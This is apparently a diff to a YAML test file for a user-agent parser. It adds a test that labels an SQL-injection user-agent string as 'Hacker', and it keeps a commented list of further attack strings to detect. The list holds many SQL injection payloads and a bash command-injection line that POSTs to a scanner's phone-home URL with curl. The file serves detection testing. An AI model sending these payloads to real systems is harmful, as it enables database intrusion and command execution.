@@ -481,7 +481,7 @@ config:
         OperatingSystemNameVersion         : 'Hacker'      # 10
 
 
-# TODO:
+# TODO: More hack attempts to detect
 #-8067)) AS trzU WHERE 3801=3801 OR MAKE_SET(7172=7172,6095)--
 #-2734')) AS YnXr WHERE 1760=1760 OR MAKE_SET(7172=7172,6095)--
 #-3358'))) OR MAKE_SET(9429=7340,7340) AND ((('QIPX' LIKE 'QIPX
@@ -511,10 +511,7 @@ config:
 #(CASE WHEN 8578=7618 THEN 8578 ELSE NULL END)
 #(CAST((CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (1300=1300) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(118)||CHR(118)||CHR(113)) AS NUMERIC))
 #(CAST((CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113))||(SELECT 1 FROM GENERATE_SERIES(9085,9085,CASE WHEN (9085=9085) THEN 1 ELSE 0 END) LIMIT 1)::text||(CHR(113)||CHR(122)||CHR(118)||CHR(118)||CHR(113)) AS NUMERIC))
-#(compatible;
-#(compatible; MSIE 9.0; ; Trident/5.0; BOIE9;NLBE)
 #(CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(106)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (3384=3384) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(118)+CHAR(113))))
-#(DreamPassport/3.0; isao/MyDiGiRabi)
 #(EXTRACTVALUE(6481,CONCAT(0x5c,0x716b6a7671,(SELECT (ELT(6481=6481,1))),0x717a767671)))
 #(for x in {1..200} ; do echo ""for x$x in ; do :""; done; for x in {1..200} ; do echo done ; done) | bash ||%0A/usr/bin/curl -X POST https://www.tinfoilsecurity.com/scanner_phone_home/913c8c97-a67a-49bf-811b-c70ab6252eca
 #(for x in {1..200} ; do echo ""for x$x in ; do :""; done; for x in {1..200} ; do echo done ; done) | bash ||%0A/usr/bin/curl -X POST https://www.tinfoilsecurity.com/scanner_phone_home/913c8c97-a67a-49bf-811b-c70ab6252eca%00
@@ -528,4 +525,31 @@ config:
 #(SELECT (CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9479=9479) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(118)||CHR(118)||CHR(113)))
 #(SELECT (CASE WHEN (9814=1041) THEN CHAR(115)+CHAR(113)+CHAR(108)+CHAR(109)+CHAR(97)+CHAR(112)+CHAR(47)+CHAR(49)+CHAR(46)+CHAR(48)+CHAR(45)+CHAR(100)+CHAR(101)+CHAR(118)+CHAR(45)+CHAR(110)+CHAR(111)+CHAR(110)+CHAR(103)+CHAR(105)+CHAR(116)+CHAR(45)+CHAR(50)+CHAR(48)+CHAR(49)+CHAR(53)+CHAR(48)+CHAR(57)+CHAR(48)+CHAR(57)+CHAR(32)+CHAR(40)+CHAR(104)+CHAR(116)+CHAR(116)+CHAR(112)+CHAR(58)+CHAR(47)+CHAR(47)+CHAR(115)+CHAR(113)+CHAR(108)+CHAR(109)+CHAR(97)+CHAR(112)+CHAR(46)+CHAR(111)+CHAR(114)+CHAR(103)+CHAR(41) ELSE 9814*(SELECT 9814 FROM master..sysdatabases) END))
 #(select convert(int,CHAR(65)))
-#(UPDATEXML(2046,CONCAT(0x2e,0x716b6a7671,(SELECT (ELT(2046=2046,1))),0x717a767671),5014))
+
+  - test:
+      input:
+        user_agent_string: '(UPDATEXML(2046,CONCAT(0x2e,0x716b6a7671,(SELECT (ELT(2046=2046,1))),0x717a767671),5014))'
+      expected:
+        DeviceClass                        : 'Hacker'      # 10
+        DeviceName                         : 'Hacker'      # 10
+        OperatingSystemClass               : 'Hacker'      # 10
+        OperatingSystemName                : 'Hacker'      # 10
+        OperatingSystemVersion             : 'Hacker'      # 10
+        OperatingSystemNameVersion         : 'Hacker'      # 10
+        LayoutEngineClass                  : 'Hacker'      # 10
+        LayoutEngineName                   : 'Hacker'      # 10
+        LayoutEngineVersion                : 'Hacker'      # 10
+        LayoutEngineVersionMajor           : 'Hacker'      # 10
+        LayoutEngineNameVersion            : 'Hacker'      # 10
+        LayoutEngineNameVersionMajor       : 'Hacker'      # 10
+        AgentClass                         : 'Hacker'      # 10
+        AgentName                          : 'Hacker'      # 10
+        AgentVersion                       : 'Hacker'      # 10
+        AgentVersionMajor                  : 'Hacker'      # 10
+        AgentNameVersion                   : 'Hacker'      # 10
+        AgentNameVersionMajor              : 'Hacker'      # 10
+        DeviceBrand                        : 'Hacker'      # 10
+        DeviceVersion                      : 'Hacker'      # 10
+        HackerAttackVector                 : 'Unknown'     # 10
+        HackerToolkit                      : 'Unknown'     # 10
+
